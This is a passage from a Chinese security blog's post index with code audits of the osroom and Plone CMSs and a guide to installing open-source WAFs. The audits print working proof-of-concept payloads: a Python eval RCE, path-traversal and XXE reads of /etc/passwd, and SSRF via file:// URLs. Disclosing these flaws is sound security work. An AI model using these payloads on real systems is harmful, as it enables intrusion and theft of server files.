SQL注入监控菜单下的注入设置同上。等待已完成查看结果即可，需要右上角刷新页面 漏洞管理此漏洞为w13scan扫描结果漏洞展示 描述此项目主要是融合利用，存在的已知问题是：稳定性暂时没有经过大流量的测试，只是单纯的个人使用无误。如果存在其他问题，还请表哥issue。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"代码审计--osroom","slug":"代码审计-osroom","date":"2020-11-20T07:24:45.000Z","updated":"2020-11-20T07:26:48.000Z","comments":true,"path":"2020/11/代码审计-osroom/","link":"","permalink":"https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/","excerpt":"","text":"osroom这个cms很有意思，从漏洞和程序的写法上，很适合用来入门学习，漏洞的一些形式相比来说，也比较多一点。 RCEapps\\utils\\format\\obj_format.py 如下，文件中采用了eval来转换字符串对象，当json.loads转换失败的时候，则直接使用eval来转换。 def json_to_pyseq(tjson): &quot;&quot;&quot; json to python sequencer :param json: :return: &quot;&quot;&quot; if tjson in [None, &quot;None&quot;]: return None elif not isinstance(tjson, (list, dict, tuple)) and tjson !&#x3D; &quot;&quot;: if isinstance(tjson, (str, bytes)) and tjson[0] not in [&quot;&#123;&quot;, &quot;[&quot;, &quot;(&quot;]: return tjson elif isinstance(tjson, (int, float)): return tjson try: tjson &#x3D; json.loads(tjson) except BaseException: tjson &#x3D; eval(tjson) else: if isinstance(tjson, str): tjson &#x3D; eval(tjson) return tjson 转到一个使用此方法的功能，例如apps\\modules\\audit\\process\\rules.py 删除规则处，传入一个ids参数，原参数值是一个hash值，但是可以修改为python代码。 def audit_rule_delete(): ids &#x3D; json_to_pyseq(request.argget.all(&#39;ids&#39;, [])) if not isinstance(ids, list): ids &#x3D; json.loads(ids) for i, tid in enumerate(ids): ids[i] &#x3D; ObjectId(tid) r &#x3D; mdbs[&quot;sys&quot;].db.audit_rules.delete_many(&#123;&quot;_id&quot;: &#123;&quot;$in&quot;: ids&#125;&#125;) if r.deleted_count &gt; 0: data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;Delete the success,&#123;&#125;&quot;).format( r.deleted_count), &quot;msg_type&quot;: &quot;s&quot;, &quot;custom_status&quot;: 204&#125; else: data &#x3D; &#123; &quot;msg&quot;: gettext(&quot;Delete failed&quot;), &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 400&#125; return data 参数POC： &#123;123:__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#125;，查看终端输出。 只要涉及到ids参数的都存在此问题，比如另一个类别删除功能。 在用户登陆的判断中，也对传入的参数code_url_obj执行了此方法，所以存在一个前台的RCE apps\\modules\\user\\process\\online.py code_url_obj &#x3D; json_to_pyseq(request.argget.all(&#39;code_url_obj&#39;, &#123;&#125;)) 文件覆盖apps\\utils\\upload\\file_up.py ps: 此问题没有复现，理论上存在。 代码描述了一种上传typroa图像base64后处理来保存写入文件的方式，其中后缀是解析typroa图像base64开头得到，例如 data:image/jpg;base64,获得后缀为jpg，在后续的文件明拼接中，文件名被以时间戳和UUID重写构造，但是后缀可控，可以写入..\\..\\形式的遍历data:image/jpg\\..\\..\\..\\..\\tmp;base64 def fileup_base_64(uploaded_files, file_name&#x3D;None, prefix&#x3D;&quot;&quot;): &quot;&quot;&quot; 文件以base64编码上传上传 :param uploaded_files: 数组 :param bucket_var: 保存typroa图像服务器空间名的变量名, 如AVA_B :param file_name: :return: &quot;&quot;&quot; if not uploaded_files: return None keys &#x3D; [] for file_base in uploaded_files: if file_base: # data:image&#x2F;jpeg file_format &#x3D; file_base.split(&quot;;&quot;)[0].split(&quot;&#x2F;&quot;)[-1] imgdata &#x3D; base64.b64decode(file_base.split(&quot;,&quot;)[-1]) if file_name: filename &#x3D; &#39;&#123;&#125;.&#123;&#125;&#39;.format(file_name, file_format) else: filename &#x3D; &#39;&#123;&#125;_&#123;&#125;.&#123;&#125;&#39;.format( time_to_utcdate( time_stamp&#x3D;time.time(), tformat&#x3D;&quot;%Y%m%d%H%M%S&quot;), uuid1(), file_format) 传入后可以造成一种保存文件到其他目录的效果，这种遍历在Linux下是不允许的，但在Windows下可执行，win支持及../和..\\，还可以文件结尾的回退遍历，所以在Windows下可以造成覆写。 由于兼容性，Windows下有个别的包兼容有问题，并没有复现，附一张Linux的目录构造图 上传文件覆盖如果上面那个不是很清楚，这个就比较明显了，插件上传功能中。 apps\\modules\\plug_in_manager\\process\\manager.py def upload_plugin(): &quot;&quot;&quot; 插件上传 :return: &quot;&quot;&quot; file &#x3D; request.files[&quot;upfile&quot;] file_name &#x3D; os.path.splitext(file.filename) #(&#39;123&#39;,&#39;.zip&#39;) filename &#x3D; os.path.splitext(file.filename)[0] #123 extension &#x3D; file_name[1] #.zip if not extension.strip(&quot;.&quot;).lower() in [&quot;zip&quot;]: data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File format error, please upload zip archive&quot;), &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 401&#125; return data if not os.path.exists(PLUG_IN_FOLDER): #osroom&#x2F;apps&#x2F;plugins os.makedirs(PLUG_IN_FOLDER) fpath &#x3D; os.path.join(PLUG_IN_FOLDER, filename) ##osroom&#x2F;apps&#x2F;plugins&#x2F;123 if os.path.isdir(fpath) or os.path.exists(fpath): if mdbs[&quot;sys&quot;].db.plugin.find_one( &#123;&quot;plugin_name&quot;: filename, &quot;is_deleted&quot;: &#123;&quot;$in&quot;: [0, False]&#125;&#125;): # 如果插件没有准备删除标志 data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;The same name plugin already exists&quot;), &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 403&#125; return data else: # 否则清除旧的插件 shutil.rmtree(fpath) mdbs[&quot;sys&quot;].db.plugin.update_one(&#123;&quot;plugin_name&quot;: filename&#125;, &#123; &quot;$set&quot;: &#123;&quot;is_deleted&quot;: 0&#125;&#125;) # 保存主题 save_file &#x3D; os.path.join(&quot;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(PLUG_IN_FOLDER, file.filename)) ##osroom&#x2F;apps&#x2F;plugins&#x2F;123.zip file.save(save_file) 上传文件后分割文件和后缀，判断插件是否存在以及是否清理就插件，在下面保存的时候，直接使用了上传的参数名做拼接，导致可以被跨目录保存，比如文件应该保存到osroom/apps/plugins/下，上传如下 我们在系统查看 路径跳转apps\\modules\\user\\process\\sign_in.py ps：此问题影响较小，当作分析即可 在代码中存在一个获取值的参数next，这个参数是登陆的时候默认没有存在，可能是为了跳转登陆留下的参数。参数值为任意值的时候，返回的to_url的值就为参数值。 def p_sign_in( username, password, code_url_obj, code, remember_me, use_jwt_auth&#x3D;0): &quot;&quot;&quot; 用户登录函数 :param adm: :return: &quot;&quot;&quot; data &#x3D; &#123;&#125; if current_user.is_authenticated and username in [current_user.username, current_user.email, current_user.mphone_num]: data[&#39;msg&#39;] &#x3D; gettext(&quot;Is logged in&quot;) data[&quot;msg_type&quot;] &#x3D; &quot;s&quot; data[&quot;custom_status&quot;] &#x3D; 201 data[&#39;to_url&#39;] &#x3D; request.argget.all( &#39;next&#39;) or get_config(&quot;login_manager&quot;, &quot;LOGIN_IN_TO&quot;) return data 然后在前端js中apps\\admin_pages\\pages\\sign-in.html 直接获取响应的data的to_url进行跳转，类似于统一登陆中的任意域跳转的问题。 var result &#x3D; osrHttp(&quot;PUT&quot;,&quot;&#x2F;api&#x2F;sign-in&quot;, d); result.then(function (r) &#123; if(r.data.msg_type&#x3D;&#x3D;&quot;s&quot;)&#123; window.location.href &#x3D; r.data&#x2F;to_url; &#125;else if(r.data.open_img_verif_code)&#123; get_imgcode(); &#125; &#125;).catch(function (r) &#123; if(r.data.open_img_verif_code)&#123; get_imgcode(); &#125; &#125;); 任意文件读取apps\\modules\\theme_setting\\process\\static_file.py 读取静态文件模板的时候，直接使用了请求的参数进行拼接访问，导致可以任意读取文件 def get_static_file_content(): &quot;&quot;&quot; 获取静态文件内容, 如html文件 :return: &quot;&quot;&quot; filename &#x3D; request.argget.all(&#39;filename&#39;, &quot;index&quot;).strip(&quot;&#x2F;&quot;) file_path &#x3D; request.argget.all(&#39;file_path&#39;, &quot;&quot;).strip(&quot;&#x2F;&quot;) theme_name &#x3D; request.argget.all(&quot;theme_name&quot;) s, r &#x3D; arg_verify([(gettext(&quot;theme name&quot;), theme_name)], required&#x3D;True) if not s: return r path &#x3D; os.path.join( THEME_TEMPLATE_FOLDER, theme_name) file &#x3D; &quot;&#123;&#125;&#x2F;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(path, file_path, filename) if not os.path.exists(file) or THEME_TEMPLATE_FOLDER not in file: data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File not found,&#39;&#123;&#125;&#39;&quot;).format(file), &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 404&#125; else: with open(file) as wf: content &#x3D; wf.read() data &#x3D; &#123; &quot;content&quot;: content, &quot;file_relative_path&quot;: file_path.replace( path, &quot;&quot;).strip(&quot;&#x2F;&quot;)&#125; return data 构造POC：http://192.168.120.128:5000/api/admin/static/file?file_path=pages/account/settings/../../../../../../../../etc&amp;filename=passwd&amp;theme_name=osr-theme-w","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"代码审计--Plone","slug":"代码审计-Plone","date":"2020-11-18T01:32:02.000Z","updated":"2020-11-18T01:35:28.000Z","comments":true,"path":"2020/11/代码审计-Plone/","link":"","permalink":"https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Plone/","excerpt":"","text":"PlonePlone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这个查看起来查找对应功能实在是费劲。 SSRFplone.app.event-3.2.7-py3.6.egg\\plone\\app\\event\\ical\\importer.py @button.buttonAndHandler(u&#39;Save and Import&#39;) def handleSaveImport(self, action): data, errors &#x3D; self.extractData() if errors: return False self.save_data(data) ical_file &#x3D; data[&#39;ical_file&#39;] ical_url &#x3D; data[&#39;ical_url&#39;] event_type &#x3D; data[&#39;event_type&#39;] sync_strategy &#x3D; data[&#39;sync_strategy&#39;] if ical_file or ical_url: if ical_file: # File upload is not saved in settings ical_resource &#x3D; ical_file.data ical_import_from &#x3D; ical_file.filename else: ical_resource &#x3D; urllib.request.urlopen(ical_url).read() ical_import_from &#x3D; ical_url import_metadata &#x3D; ical_import( self.context, ics_resource&#x3D;ical_resource, event_type&#x3D;event_type, sync_strategy&#x3D;sync_strategy, ) 如上所述，在读取参数 ical_url时，根据程序设置是导入该事件的 icalendar资源文件，但对如何读取资源文件没有限制，可以直接使用urllib包进行读取和返回 在Members功能下的Action中选择Enable icalendar import后，配置Icalendar URL参数。 参数：http://127.0.0.1:22，执行Save and Import。 urllib还支持文件协议，因此也可以用于文件读取 参数: file:///proc/self/environ XXEplone.app.registry-1.7.6-py3.6.egg\\plone\\app\\registry\\browser\\records.py def import_registry(self): try: fi &#x3D; self.request.form[&#39;file&#39;] body &#x3D; fi.read() except (AttributeError, KeyError): messages &#x3D; IStatusMessage(self.request) messages.add(u&quot;Must provide XML file&quot;, type&#x3D;u&quot;error&quot;) body &#x3D; None if body is not None: importer &#x3D; RegistryImporter(self.context, FakeEnv()) try: importer.importDocument(body) except XMLSyntaxError: messages &#x3D; IStatusMessage(self.request) messages.add(u&quot;Must provide valid XML file&quot;, type&#x3D;u&quot;error&quot;) return self.request.response.redirect(self.context.absolute_url()) 注意importDocument方法，该方法在lxml.etree下调用该方法 plone.app.registry-1.7.6-py3.6.egg\\plone\\app\\registry\\exportimport\\handler.py class RegistryImporter(object): &quot;&quot;&quot;Helper classt to import a registry file &quot;&quot;&quot; LOGGER_ID &#x3D; &#39;plone.app.registry&#39; def __init__(self, context, environ): self.context &#x3D; context self.environ &#x3D; environ self.logger &#x3D; environ.getLogger(self.LOGGER_ID) def importDocument(self, document): tree &#x3D; etree.fromstring(document) if self.environ.shouldPurge(): self.context.records.clear() i18n_domain &#x3D; tree.attrib.get(ns(&#39;domain&#39;, I18N_NAMESPACE)) if i18n_domain: parseinfo.i18n_domain &#x3D; i18n_domain for node in tree: if not isinstance(node.tag, str): continue condition &#x3D; node.attrib.get(&#39;condition&#39;, None) if condition and not evaluateCondition(condition): continue if node.tag.lower() &#x3D;&#x3D; &#39;record&#39;: self.importRecord(node) elif node.tag.lower() &#x3D;&#x3D; &#39;records&#39;: self.importRecords(node) parseinfo.i18n_domain &#x3D; None 此方法是此XXE的原因。 在网站设置Site Setup下的Configuration Registry中导出合适的XML文件。 在这里，选择了plone.thumb_scale_table.xml前缀文件。 参数 POC： &lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39;?&gt; &lt;!DOCTYPE value [ &lt;!ELEMENT value ANY &gt; &lt;!ENTITY title SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt; &lt;registry&gt; &lt;records interface&#x3D;&quot;Products.CMFPlone.interfaces.controlpanel.ISiteSchema&quot; prefix&#x3D;&quot;plone&quot;&gt; &lt;value key&#x3D;&quot;thumb_scale_table&quot;&gt;&amp;title;&lt;&#x2F;value&gt; &lt;&#x2F;records&gt; &lt;&#x2F;registry&gt; 执行后，您可以在错误报告中看到已解析的XML实体。 XXE-2plone.app.dexterity-2.6.5-py3.6.egg\\plone\\app\\dexterity\\browser\\modeleditor.py class AjaxSaveHandler(BrowserView): &quot;&quot;&quot;Handle AJAX save posts. &quot;&quot;&quot; def __call__(self): &quot;&quot;&quot;Handle AJAX save post. &quot;&quot;&quot; if not authorized(self.context, self.request): raise Unauthorized source &#x3D; self.request.form.get(&#39;source&#39;) if source: # Is it valid XML? try: root &#x3D; etree.fromstring(source) except etree.XMLSyntaxError as e: return json.dumps(&#123; &#39;success&#39;: False, &#39;message&#39;: &#39;XMLSyntaxError: &#123;0&#125;&#39;.format( safe_unicode(e.args[0]) ) &#125;) # a little more sanity checking, look at first two element levels if root.tag !&#x3D; NAMESPACE + &#39;model&#39;: return json.dumps(&#123; &#39;success&#39;: False, &#39;message&#39;: _(u&quot;Error: root tag must be &#39;model&#39;&quot;) &#125;) for element in root.getchildren(): if element.tag !&#x3D; NAMESPACE + &#39;schema&#39;: return json.dumps(&#123; &#39;success&#39;: False, &#39;message&#39;: _( u&quot;Error: all model elements must be &#39;schema&#39;&quot; ) &#125;) # can supermodel parse it? # This is mainly good for catching bad dotted names. try: plone.supermodel.loadString(source, policy&#x3D;u&#39;dexterity&#39;) except SupermodelParseError as e: message &#x3D; e.args[0].replace(&#39;\\n File &quot;&lt;unknown&gt;&quot;&#39;, &#39;&#39;) return json.dumps(&#123; &#39;success&#39;: False, &#39;message&#39;: u&#39;SuperModelParseError: &#123;0&#125;&#39;.format(message) &#125;) 上面的代码使用lxml库，但是直接解析xml中的外部参数。 结果，在功能 Dexterity Content Types下选择 custom content types，然后单击进入。 fields标签下的Edit XML Field Model可以直接编写xml代码。 参数 POC： &lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt; &lt;model xmlns:i18n&#x3D;&quot;http:&#x2F;&#x2F;xml.zope.org&#x2F;namespaces&#x2F;i18n&quot; xmlns:marshal&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;marshal&quot; xmlns:form&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;form&quot; xmlns:security&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;security&quot; xmlns:users&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;users&quot; xmlns:lingua&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;lingua&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;schema&quot;&gt; &amp;title;&lt;schema&#x2F;&gt; &lt;&#x2F;model&gt; 因为程序代码中似乎存在问题，所以无法添加XML声明文件，但是打开的默认声明文件具有添加的声明文件。 需要删除。 保存参数，并在返回后单击此处查看它们。 问题相对利用条件较高，需要管理员权限，其后官方推出了更新版本5.2.3：https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"开源WAF搭建","slug":"开源WAF搭建","date":"2020-09-17T07:42:09.000Z","updated":"2020-09-17T07:42:29.000Z","comments":true,"path":"2020/09/开源WAF搭建/","link":"","permalink":"https://misakikata.github.io/2020/09/%E5%BC%80%E6%BA%90WAF%E6%90%AD%E5%BB%BA/","excerpt":"","text":"ModSecurity在Ubuntu和Nginx上安装，nginx版本为1.14.0。 安装需要包apt-get install -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev 下载编译ModSecurity 3.0源代码git clone --depth 1 -b v3&#x2F;master --single-branch https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity 进入目录运行编译 .&#x2F;build.sh git submodule init git submodule update .&#x2F;configure make make install 如果出现fatal: No names found, cannot describe anything.，是可以忽略的。 ModSecurity连接器下载连接器代码 git clone --depth 1 https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity-nginx.git 根据已安装的nginx版本安装需要的nginx原代码 wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.14.0.tar.gz tar zxvf nginx-1.14.0.tar.gz 需要把连接器编译为动态模块到nginx中，到nginx目录下，其中的编译命令根据nginx -V来决定。 .&#x2F;configure --with-compat --add-dynamic-module&#x3D;..&#x2F;ModSecurity-nginx make modules mkdir &#x2F;etc&#x2F;nginx&#x2F;modules cp objs&#x2F;ngx_http_modsecurity_module.so &#x2F;etc&#x2F;nginx&#x2F;modules&#x2F; PS：运行nginx -t测试nginx运行，如果出现报错ModSecurity二进制文件不匹配，则可能是nginx版本验证不匹配，那就需要源码编译安装nginx，同时把ModSecurity一起编译。 加载nginx动态模块编译完成后的动态模块需要到配置文件中启动加载，修改配置文件/etc/nginx/nginx.conf中 load_module &#x2F;etc&#x2F;nginx&#x2F;modules&#x2F;ngx_http_modsecurity_module.so; 启用和测试规则安装Spiderlabs的规则 mkdir &#x2F;etc&#x2F;nginx&#x2F;modsec wget -P &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F; https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;SpiderLabs&#x2F;ModSecurity&#x2F;v3&#x2F;master&#x2F;modsecurity.conf-recommended mv &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf-recommended &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf 把ModSecurity中的unicode.mapping文件复制到以上目录 cp ModSecurity&#x2F;unicode.mapping &#x2F;etc&#x2F;nginx&#x2F;modsec 修改配置文件，其中配置部分被注释，需要安需要启用。 SecRuleEngine DetectionOnly #仅检测恶意流量，改为on为丢弃恶意流量 添加owasp的规则，在nginx下创建目录 mkdir owasp-modsecurity-crs cd owasp-modsecurity-crs wget https:&#x2F;&#x2F;github.com&#x2F;coreruleset&#x2F;coreruleset&#x2F;archive&#x2F;v3.3.0.tar.gz mv crs-setup.conf.example crs-setup.conf mv rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf mv rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf 在modsec中修改modsecurity.conf，添加配置文件，同时把rules目录下的配置文件添加进去 Include &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;owasp-modsecurity-crs&#x2F;coreruleset-3.3.0&#x2F;crs-setup.conf Include &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;owasp-modsecurity-crs&#x2F;coreruleset-3.3.0&#x2F;rules&#x2F;*.conf 在nginx配置文件中添加此配置 vi sites-enabled&#x2F;default server &#123; listen 80; modsecurity on; modsecurity_rules_file &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf; &#125; 可以到crs配置文件中找到对应的规则来启用，比如如下启用id为900240的后缀文件检测 C:\\Users\\user&gt;curl http:&#x2F;&#x2F;192.168.120.142&#x2F;admin.db &lt;html&gt; &lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &lt;body bgcolor&#x3D;&quot;white&quot;&gt; &lt;center&gt;&lt;h1&gt;403 Forbidden&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt; &lt;hr&gt;&lt;center&gt;nginx&#x2F;1.14.0&lt;&#x2F;center&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 默认情况下会拦截常见的web攻击，比如 C:\\Users\\user&gt;curl http:&#x2F;&#x2F;192.168.120.142&#x2F;admin.php?id&#x3D;1%20and%201&#x3D;1 &lt;html&gt; &lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &lt;body bgcolor&#x3D;&quot;white&quot;&gt; &lt;center&gt;&lt;h1&gt;403 Forbidden&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt; &lt;hr&gt;&lt;center&gt;nginx&#x2F;1.14.0&lt;&#x2F;center&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 配置新的conf文件如果默认的规则文件不符合需求，获取由于其他原因需要添加规则。先看一个普通的规则是怎么样的 SecRule REQUEST_FILENAME &quot;@endsWith &#x2F;wp-login.php&quot; \\ &quot;id:1003,\\ phase:2,\\ pass,\\ nolog,\\ ctl:ruleRemoveTargetByTag&#x3D;OWASP_CRS;ARGS:pwd&quot; 相当于在wp-login.php页面中，禁用对参数pwd的拦截检查。其中的格式是 SecRule VARIABLES OPERATOR ACTIONS VARIABLES ：代表HTTP包中的标识项，规定了安全规则针对的对象。 OPERATOR：代表操作符，一般用来定义安全规则的匹配条件。 ACTIONS：代表响应动作，一般用来定义数据包被规则命中后的响应动作。 比如，我们打算写一个只允许特定IP访问的路径。这时候需要两条规则来判断，需要chain来连接动作。把它保存到上面crs配置文件路径。重启nginx SecRule REQUEST_FILENAME &quot;@endsWith &#x2F;login.php&quot; \\ &quot;id:91002,\\ phase:1,\\ pass,\\ nolog,\\ deny,\\ chain&quot; SecRule REMOTE_ADDR &quot;!@ipMatch 192.168.120.1&quot; \\ &quot;t:none&quot; 配置文档参考：http://www.modsecurity.cn/chm/ConfigurationDirectives.html VeryNginxVeryNginx 基于 lua_nginx_module(openrestry) 开发。 集成在 Nginx 中运行，扩展了 Nginx 本身的功能，并提供了友好的 Web 交互界面。本质上这并不是一个WAF，只是openrestry的界面化。但是可以通过界面化的配置规则来实现waf的功能。 https://github.com/alexazhou/VeryNginx 一键配置克隆 VeryNginx 仓库到本地, 然后进入仓库目录，执行以下命令 python install.py install 即可一键安装 VeryNginx 和 以及依赖的 OpenResty，可以先修改其中的版本为新版本地址再安装。 手动安装手动安装，需要本地的nginx有openrestry，所以先安装。 apt-get install libreadline-dev libpcre3-dev libssl-dev perl wget https:&#x2F;&#x2F;openresty.org&#x2F;download&#x2F;openresty-1.17.8.2.tar.gz .&#x2F;configure -j2 make -j2 sudo make install export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;openresty&#x2F;bin:$PATH 这时候会把openrestry加入快捷命令，如果直接执行openrestry将开启自带的nginx。 再来安装verynginx python install.py install verynginx 在nginx的配置文件中添加以下规则，需要配置到不同的地方。 include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_external.conf; #http外部 include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_http_block.conf; #http内部 include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_server_block.conf; #server内部 在地址/verynginx/index_zh.html下即可访问到页面。 默认的账号密码都是verynginx / verynginx。添加规则的方式比modsecurity简单，但自带的规则过于简单，需要自己添加规则。 已有的规则可以参考：https://github.com/unixhot/waf JxWafhttps://github.com/jx-sec/jxwaf jxwaf(锦衣盾)是一款开源WEB应用防火墙，分为客户端和服务端，客户端也是openrestry开发而来。 服务端安装采用私有化部署 docker run -d -p 80:80 jxwaf&#x2F;jxwaf-server:latest 拉取后，访问地址邮箱验证码随便填写，注册账号在全局配置页面获取”api key”和”api password” 客户端安装git clone https:&#x2F;&#x2F;github.com&#x2F;jx-sec&#x2F;jxwaf.git cd jxwaf sh install_waf.sh 在下载的文件内： cd tools python jxwaf_init.py --api_key&#x3D;xxxx --api_password&#x3D;xxxx --waf_server&#x3D;http:&#x2F;&#x2F;192.168.1.1 &#x2F;opt&#x2F;jxwaf&#x2F;nginx&#x2F;sbin&#x2F;nginx 在网站管理中添加对应的域名和IP端口 Janusec可多节点布置的应用网关。https://github.com/Janusec/janusec wget https:&#x2F;&#x2F;www.janusec.com&#x2F;download&#x2F;janusec-latest.tar.gz tar zxf .&#x2F;janusec-latest.tar.gz cd janusec-0.9.9 .&#x2F;install.sh 此处选择的是1，主节点。默认安装的路径为 /usr/local/janusec/ 由于需要postgresql sudo apt-get install postgresql postgresql-client sudo -i -u postgres create user janusec with password &#39;janusec&#39;; create database janusec owner janusec; grant all on database janusec to janusec; \\q 然后编辑 /usr/local/janusec/config.json ，尝试开启waf systemctl start janusec 设置中管理太台监听设置为true，则使用http:9080端口，此处修改为false，直接在目录janusec-admin/ 默认用户名：admin，默认口令：J@nusec123。在应用管理中添加IP端口信息即可。","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"基于inotify的Linux文件实时监控扫描","slug":"基于inotify的Linux文件实时监控扫描","date":"2020-09-04T09:02:23.000Z","updated":"2020-09-04T09:02:38.000Z","comments":true,"path":"2020/09/基于inotify的Linux文件实时监控扫描/","link":"","permalink":"https://misakikata.github.io/2020/09/%E5%9F%BA%E4%BA%8Einotify%E7%9A%84Linux%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E6%89%AB%E6%8F%8F/","excerpt":"","text":"watchfile项目地址：https://github.com/MisakiKata/watchfile 安装#第三方库 pip install pyinotify #使用supervisor来守护进程 apt-get install supervisor yum install supervisor 使用#安装完成后需要启动，按需要修改配置文件 supervisord -c &#x2F;etc&#x2F;supervisor&#x2F;supervisord.conf #配置文件例子 ; supervisor config file [unix_http_server] file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; (the path to the socket file) chmod&#x3D;0700 ; sockef file mode (default 0700) [supervisord] logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; (main log file;default $CWD&#x2F;supervisord.log) pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; (supervisord pidfile;default supervisord.pid) childlogdir&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor ; (&#39;AUTO&#39; child log dir, default $TEMP) ; the below section must remain in the config file for RPC ; (supervisorctl&#x2F;web interface) to work, additional interfaces may be ; added by defining them in separate rpcinterface: sections [rpcinterface:supervisor] supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; use a unix:&#x2F;&#x2F; URL for a unix socket ; The [include] section can just contain the &quot;files&quot; setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files &#x3D; &#x2F;data&#x2F;vscode&#x2F;watchfile&#x2F;watchfile.conf #修改自己的配置文件地址 由于调用了河马扫描程序来检测文件，所以大量文件同时变更时，检测会慢，建议系统做大量变更时可以停掉程序。 运行测试在config.ini 中修改自己的配置，因为使用多线程来监控多目录，建议使用多目录配置 运行 python3 daemon.py来查看输出和测试邮件 异常处理 查看输出日志的时候，如果出现wd&#x3D;-1 需要修改 vim &#x2F;etc&#x2F;sysctl.conf fs.inotify.max_user_watches &#x3D; 128000 #决定了同时同一用户可以监控的目录数量 日志中看到Event Queue Overflow max_queued_events太小需要调整参数","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"https://misakikata.github.io/tags/shell/"}]},{"title":"内网渗透横行移动","slug":"内网渗透横行移动","date":"2020-08-12T01:03:29.000Z","updated":"2020-08-12T01:03:29.000Z","comments":true,"path":"2020/08/内网渗透横行移动/","link":"","permalink":"https://misakikata.github.io/2020/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E8%A1%8C%E7%A7%BB%E5%8A%A8/","excerpt":"","text":"在进行这些东西之前，至少需要一个可完整交互的shell，默认就已经获得了shell，并且提权到nt authority\\system AS-REP 